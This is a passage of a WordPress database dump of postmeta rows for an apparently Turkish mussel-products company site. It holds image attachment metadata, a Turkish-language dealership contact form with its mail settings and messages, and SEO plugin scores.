INSERT INTO `cmrfu_postmeta` VALUES("2290","1072","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1700;s:6:\"height\";i:2338;s:4:\"file\";s:39:\"2014/08/MARKA-PATENT-İSMİDO-001.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:39:\"MARKA-PATENT-İSMİDO-001-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:39:\"MARKA-PATENT-İSMİDO-001-218x300.jpg\";s:5:\"width\";i:218;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:40:\"MARKA-PATENT-İSMİDO-001-768x1056.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1056;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:40:\"MARKA-PATENT-İSMİDO-001-745x1024.jpg\";s:5:\"width\";i:745;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:39:\"MARKA-PATENT-İSMİDO-001-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:39:\"MARKA-PATENT-İSMİDO-001-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:39:\"MARKA-PATENT-İSMİDO-001-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:37:\"MARKA-PATENT-İSMİDO-001-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2289","1072","_wp_attached_file","2014/08/MARKA-PATENT-İSMİDO-001.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1859","497","_edit_lock","1409340497:1");
INSERT INTO `cmrfu_postmeta` VALUES("2106","995","_form","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Telefon (gerekli)<br />
    [tel* tel-876] </p>

<p>Adres<br />
    [textarea textarea-659]</p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-357 size:m] [captchar captcha-357]</p>

<p>[submit \"Gönder\"]</p>");
INSERT INTO `cmrfu_postmeta` VALUES("2107","995","_mail","a:8:{s:7:\"subject\";s:13:\"Bayilik Formu\";s:6:\"sender\";s:18:\"info@ismido.com.tr\";s:4:\"body\";s:101:\"isim: [your-name]

email: [your-email]
telefon: [tel-876]
adres: [textarea-659]
mesaj: [your-message]\";s:9:\"recipient\";s:18:\"info@ismido.com.tr\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:1;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("2108","995","_mail_2","a:9:{s:6:\"active\";b:0;s:7:\"subject\";s:0:\"\";s:6:\"sender\";s:0:\"\";s:4:\"body\";s:0:\"\";s:9:\"recipient\";s:0:\"\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("2109","995","_messages","a:23:{s:12:\"mail_sent_ok\";s:56:\"İletiniz başarılı olarak gönderildi. Teşekkürler.\";s:12:\"mail_sent_ng\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:16:\"validation_error\";s:85:\"Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.\";s:4:\"spam\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:12:\"accept_terms\";s:48:\"İlerlemek için lütfen koşulları kabul edin.\";s:16:\"invalid_required\";s:35:\"Lütfen gerekli alanları doldurun.\";s:17:\"captcha_not_match\";s:30:\"Girdiğiniz kod doğru değil.\";s:14:\"invalid_number\";s:37:\"Sayı biçimi geçersiz görünüyor.\";s:16:\"number_too_small\";s:23:\"Bu sayı çok küçük.\";s:16:\"number_too_large\";s:22:\"Bu sayı çok büyük.\";s:13:\"invalid_email\";s:37:\"Eposta adresi geçersiz görünüyor.\";s:11:\"invalid_url\";s:27:\"URL geçersiz görünüyor.\";s:11:\"invalid_tel\";s:41:\"Telefon numarası geçersiz görünüyor.\";s:23:\"quiz_answer_not_correct\";s:27:\"Yanıtınız doğru değil.\";s:12:\"invalid_date\";s:37:\"Tarih biçimi geçersiz görünüyor.\";s:14:\"date_too_early\";s:20:\"Bu tarih çok erken.\";s:13:\"date_too_late\";s:19:\"Bu tarih çok geç.\";s:13:\"upload_failed\";s:29:\"Dosya gönderme başarısız.\";s:24:\"upload_file_type_invalid\";s:34:\"Bu dosya türüne izin verilmiyor.\";s:21:\"upload_file_too_large\";s:22:\"Bu dosya çok büyük.\";s:23:\"upload_failed_php_error\";s:49:\"Dosya gönderme başarısız. Hata meydana geldi.\";s:16:\"invalid_too_long\";s:22:\"The field is too long.\";s:17:\"invalid_too_short\";s:23:\"The field is too short.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2110","995","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("2111","995","_locale","tr_TR");
INSERT INTO `cmrfu_postmeta` VALUES("2195","524","_yoast_wpseo_content_score","90");
INSERT INTO `cmrfu_postmeta` VALUES("2196","1049","_wp_attached_file","2016/11/img051.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2197","1049","_wp_attachment_metadata","a:5:{s:5:\"width\";i:500;s:6:\"height\";i:318;s:4:\"file\";s:18:\"2016/11/img051.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"img051-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"img051-300x191.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:191;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"img051-500x230.jpg\";s:5:\"width\";i:500;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"img051-450x318.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:318;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"img051-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"img051-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2198","1050","_wp_attached_file","2016/11/logo2.png");
INSERT INTO `cmrfu_postmeta` VALUES("2199","1050","_wp_attachment_metadata","a:5:{s:5:\"width\";i:142;s:6:\"height\";i:90;s:4:\"file\";s:17:\"2016/11/logo2.png\";s:5:\"sizes\";a:1:{s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"logo2-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2200","1051","_wp_attached_file","2016/11/logo3.png");
INSERT INTO `cmrfu_postmeta` VALUES("2201","1051","_wp_attachment_metadata","a:5:{s:5:\"width\";i:160;s:6:\"height\";i:101;s:4:\"file\";s:17:\"2016/11/logo3.png\";s:5:\"sizes\";a:2:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"logo3-150x101.png\";s:5:\"width\";i:150;s:6:\"height\";i:101;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"logo3-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2202","944","_yoast_wpseo_content_score","60");
INSERT INTO `cmrfu_postmeta` VALUES("2203","1053","_wp_attached_file","2014/08/gidasicil.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2204","1053","_wp_attachment_metadata","a:5:{s:5:\"width\";i:750;s:6:\"height\";i:1031;s:4:\"file\";s:21:\"2014/08/gidasicil.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:21:\"gidasicil-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:21:\"gidasicil-218x300.jpg\";s:5:\"width\";i:218;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:22:\"gidasicil-745x1024.jpg\";s:5:\"width\";i:745;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:21:\"gidasicil-750x230.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:21:\"gidasicil-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:21:\"gidasicil-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:19:\"gidasicil-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2205","946","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("2208","186","_wp_old_slug","alpay-konak-dukkan");
INSERT INTO `cmrfu_postmeta` VALUES("2209","186","_yoast_wpseo_primary_portfolio_category","58");
INSERT INTO `cmrfu_postmeta` VALUES("2212","1057","_wp_attached_file","2013/10/urunler_2.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2213","1057","_wp_attachment_metadata","a:5:{s:5:\"width\";i:500;s:6:\"height\";i:500;s:4:\"file\";s:21:\"2013/10/urunler_2.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:21:\"urunler_2-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:21:\"urunler_2-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:21:\"urunler_2-500x230.jpg\";s:5:\"width\";i:500;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:21:\"urunler_2-450x500.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:500;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:21:\"urunler_2-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:19:\"urunler_2-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2217","1058","_wp_attached_file","2013/10/jumbo_midye_dolma.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2218","1058","_wp_attachment_metadata","a:5:{s:5:\"width\";i:500;s:6:\"height\";i:500;s:4:\"file\";s:29:\"2013/10/jumbo_midye_dolma.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:29:\"jumbo_midye_dolma-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:29:\"jumbo_midye_dolma-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:29:\"jumbo_midye_dolma-500x230.jpg\";s:5:\"width\";i:500;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:29:\"jumbo_midye_dolma-450x500.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:500;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:29:\"jumbo_midye_dolma-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:27:\"jumbo_midye_dolma-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2224","177","_wp_old_slug","hervenik-dubleks-6");
INSERT INTO `cmrfu_postmeta` VALUES("2225","177","_yoast_wpseo_primary_portfolio_category","");
INSERT INTO `cmrfu_postmeta` VALUES("2294","1075","_wp_attached_file","2014/08/Midyenin-Faydaları-Nelerdir.docx");
INSERT INTO `cmrfu_postmeta` VALUES("2292","1073","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1700;s:6:\"height\";i:2338;s:4:\"file\";s:25:\"2014/08/marka-tescili.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:25:\"marka-tescili-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:25:\"marka-tescili-218x300.jpg\";s:5:\"width\";i:218;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:26:\"marka-tescili-768x1056.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1056;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:26:\"marka-tescili-745x1024.jpg\";s:5:\"width\";i:745;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:25:\"marka-tescili-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:25:\"marka-tescili-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:25:\"marka-tescili-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:23:\"marka-tescili-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2291","1073","_wp_attached_file","2014/08/marka-tescili.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2287","1071","_wp_attached_file","2014/08/kayıt-belgesi-001.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2288","1071","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1700;s:6:\"height\";i:2338;s:4:\"file\";s:30:\"2014/08/kayıt-belgesi-001.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"kayıt-belgesi-001-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:30:\"kayıt-belgesi-001-218x300.jpg\";s:5:\"width\";i:218;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"kayıt-belgesi-001-768x1056.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1056;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:31:\"kayıt-belgesi-001-745x1024.jpg\";s:5:\"width\";i:745;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:30:\"kayıt-belgesi-001-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:30:\"kayıt-belgesi-001-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:30:\"kayıt-belgesi-001-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:28:\"kayıt-belgesi-001-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2299","1078","_wp_attached_file","2014/08/onay-belgesi-001.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2300","1078","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1700;s:6:\"height\";i:2338;s:4:\"file\";s:28:\"2014/08/onay-belgesi-001.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:28:\"onay-belgesi-001-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:28:\"onay-belgesi-001-218x300.jpg\";s:5:\"width\";i:218;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:29:\"onay-belgesi-001-768x1056.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1056;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:29:\"onay-belgesi-001-745x1024.jpg\";s:5:\"width\";i:745;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:28:\"onay-belgesi-001-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:28:\"onay-belgesi-001-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:28:\"onay-belgesi-001-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"onay-belgesi-001-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2301","1083","_wp_attached_file","2017/01/logo-2-e1483902960242.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2302","1083","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:158;s:4:\"file\";s:33:\"2017/01/logo-2-e1483902960242.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"logo-2-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"logo-2-300x236.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:236;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:18:\"logo-2-768x605.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:605;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"logo-2-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"logo-2-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"logo-2-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"logo-2-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2303","1083","_edit_lock","1483902849:1");
INSERT INTO `cmrfu_postmeta` VALUES("2304","1083","_wp_attachment_backup_sizes","a:1:{s:9:\"full-orig\";a:3:{s:5:\"width\";i:779;s:6:\"height\";i:614;s:4:\"file\";s:10:\"logo-2.jpg\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2305","1083","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2306","1083","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("2309","1086","_wp_attached_file","2017/01/frizLEL.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2310","1086","_wp_attachment_metadata","a:5:{s:5:\"width\";i:2880;s:6:\"height\";i:1800;s:4:\"file\";s:19:\"2017/01/frizLEL.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:19:\"frizLEL-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:19:\"frizLEL-300x188.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:188;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:19:\"frizLEL-768x480.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:480;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:20:\"frizLEL-1024x640.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:640;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:19:\"frizLEL-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:19:\"frizLEL-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:19:\"frizLEL-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}